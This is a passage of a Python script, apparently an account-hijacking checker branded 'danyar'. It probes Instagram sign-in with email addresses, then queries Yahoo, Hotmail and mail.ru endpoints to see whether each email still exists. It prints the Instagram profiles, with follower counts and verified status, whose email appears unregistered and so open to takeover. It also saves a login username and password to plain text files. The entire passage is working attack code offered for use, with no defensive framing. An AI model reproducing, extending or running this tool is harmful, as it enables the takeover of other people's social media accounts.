                day2 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
                
            
                if '"message":"There was an error with your request. Please try again."' in day2:
                    data_yah00 = {
    'crumb': 'Z1C8TjYGMDv',
'acrumb': 'NBwjCaCi',
'sessionIndex': 'Qw--',
'displayName':'', 
'deviceCapability': '{"pa":{"status":false}}',
'username':xd,
'passwd':'1234eee1234', 
'signin': 'Next',
'persistent': 'y'
                    }
                    aah = requests.post(url=url_yah00,headers=head_yahoo,data=data_yah00)
                    
                    if '"errorMsg"' in aah.text:
                        for kun in anii:
                            for kun2 in bahaa:
                                for kun3 in lordd:
                                    for kun4 in loraa:
                                        print("<>------danyar-------<>")
                                        print("username :"+kun)
                                        print("Followers :"+kun2)
                                        print("Following :"+kun3)
                                        print("Email :"+xd)
                                        print("Isverified :"+kun4)
                                        count+=1

            if '@hotmail.com' in xd:
                
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day3 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
               
            
                if '"message":"There was an error with your request. Please try again."' in day3:
                    json_hotmail={
	"checkPhones": "false",
	"federationFlags": "3",
	"flowToken": "DXfLqm3TrA3KeBHTFkW5zuzzLr4Qg6BD4ws3rURUNm*rcrojXs0H!FXZxfQTcGJRyZKwZMEvQU88DaDPqP10jnT8zJb*vd29s47WjtXgRS5Bqe7SOujr!QWoimdIaIm6KCtWzbNCm6OYTyZzPZ!XE9UQ2PXa5yMCXYZiOMHXOXSmTuE8G1I3*DMPvo7bX94P**IZVGqXJc1GGc2G!c5C8rPrLMsR7imubNzqjChZmpnYJPRk5IUA0ZfRUkn3H9D1ei2MkFrUHEYbIQCR83yD6bQ$",
	"forceotclogin": "false",
	"isCookieBannerShown": "false",
	"isExternalFederationDisallowed": "false",
	"isFidoSupported": "false",
	"isOtherIdpSupported": "true",
	"isRemoteConnectSupported": "false",
	"isRemoteNGCSupported": "true",
	"isSignup": "false",
	"otclogindisallowed": "false",
	"uaid": "9278610bfcef48f9820a8754696368a4",
	"username":xd
                    }
                    xud = requests.post(url=url_hotmail,headers=head_hotmail,json=json_hotmail)
            
                    if '"IfExistsResult":1' in xud.text:
                        for vww in anii:
                            for vww2 in bahaa:
                                for vww3 in lordd:
                                    for vww4 in  loraa:
                                        print("<>------danyar-------<>")
                                        print("username :"+vww)
                                        print("Followers :"+vww2)
                                        print("Following :"+vww3)
                                        print("Email :"+xd)
                                        print("Isverified :"+vww4)
                                        count+=1
            if '@mail.ru' in xd:
                data_insta={
        'username': xd,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
                }
                day4 = requests.post(url=url_insta,headers=head_insta,data=data_insta).text
                
            
                if '"message":"There was an error with your request. Please try again."' in day4:
        
                    url_mail ='https://account.mail.ru/api/v1/user/exists'
                    data_mail = {
                    
'email':xd
                    }
                    head_mail = {
'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
'contenttype':'application/x-www-form-urlencoded; charset=UTF-8',
                    }
                    beo = requests.post(url=url_mail,headers=head_mail,data=data_mail)
                   
                    if '"exists":false' in beo.text:
                        for x00 in bahaa:
                            for x09 in anii:
                                for x08 in lordd:
                                    for x07 in loraa:
                                        print("<>------danyar-------<>")
                                        print("username :"+x09)
                                        print("Followers :"+x00)
                                        print("Following :"+x08)
                                        print("Email :"+xd)
                                        print("Isverified :"+x07)
               




                


def acc():
    os.system('clear')
    print("PLEAS NEW ACCOUNT  FOR LOGIN")
    print('\n\n')
    usero = input("username :")
    passo = input("password :")
    filer = open("login.txt","w")
    filer2 = open("login2.txt",'w')
    filer.write(usero)
    filer2.write(passo)

        
def minu():
    os.system("clear")
    logo = """

:::::::-.    :::.   :::.    :::..-:.     ::-.:::.    :::::::..   
 ;;,   `';,  ;;`;;  `;;;;,  `;;; ';;.   ;;;;';;`;;   ;;;;``;;;;  
 `[[     [[ ,[[ '[[,  [[[[[. '[[   '[[,[[[' ,[[ '[[,  [[[,/[[['  
  $$,    $$c$$$cc$$$c $$$ "Y$c$$     c$$"  c$$$cc$$$c $$$$$$c    
  888_,o8P' 888   888,888    Y88   ,8P"`    888   888,888b "88bo,
  MMMMP"`   YMM   ""` MMM     YM  mM"       YMM   ""` MMMM   "W" 

  ----------------------------<><><>--------------------------

  """
    print(logo)
    print(' [ 1 ] USERNAME BY KEYWORD ')
    print(' [ 2 ] BY USERNAME ')
    print(' [ 3 ] START ')
    print(' [ 4 ] FOR LOGIN ACCOUNT INSTAGRAM ')
    print(' [ 5 ] EXIT ')
    print("")
    who = int(input("Choice :"))
    if who==1:
        usernamee()
        time.sleep(3)
        minu()
    if who==2:
        userone()
        time.sleep(3)
        minu()
    if who==3:
        os.system('cls')
        cheker()
        minu()
    if who==4:
        acc()
        minu()
        
    if who==5:
        os.system("clear")
        exit()
    

minu()